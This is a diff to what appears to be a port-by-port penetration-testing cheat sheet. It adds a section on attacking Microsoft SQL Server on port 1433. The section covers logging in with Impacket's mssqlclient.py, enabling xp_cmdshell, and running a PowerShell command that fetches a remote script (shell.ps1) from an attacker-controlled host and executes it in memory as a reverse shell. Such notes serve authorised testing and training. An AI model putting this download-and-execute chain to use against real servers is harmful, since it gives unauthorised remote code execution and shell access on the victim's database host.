@@ -45,6 +45,7 @@
     + [TCP Port 135 (RPC)](#tcp-port-135-rpc)
     + [TCP Port 139 (NetBIOS)](#tcp-port-139-netbios)
     + [UDP Port 161 (SNMP)](#udp-port-161-snmp)
+    + [TCP Port 1433 (MSSQL - Microsoft SQL Server)](#user-content-tcp-port-1433-mssql---microsoft-sql-server)
     + [TCP Port 1521 (Oracle TNS Listener)](#tcp-port-1521-oracle-tns-listener)
     + [TCP Port 3389 (RDP)](#tcp-port-3389-rdp)
         * [Bruteforce with `crowbar`](#bruteforce-with-crowbar)
@@ -741,6 +742,19 @@ nbtscan -r <IP>
 
 > See `snmpcheck`
  
+## TCP Port 1433 (MSSQL - Microsoft SQL Server)
+
+`mssqlclient.py` from **Impacket**
+
+```bash
+mssqlclient.py $DOMAIN/$USERNAME:$PASSWORD@$IP
+```
+- Reverse shell (PowerShell example): 
+	```SQL
+	SQL> enable_xp_cmdshell
+	SQL> xp_cmdshell whoami /all
+	SQL> EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://$IP/shell.ps1") | powershell -noprofile'
+	```
 
 ## TCP Port 1521 (Oracle TNS Listener)
 
@@ -817,7 +831,6 @@ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentL
     ```powershell
     Get-WmiObject -class Win32_Share
     ```
-    
 
 ➡️ [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
 
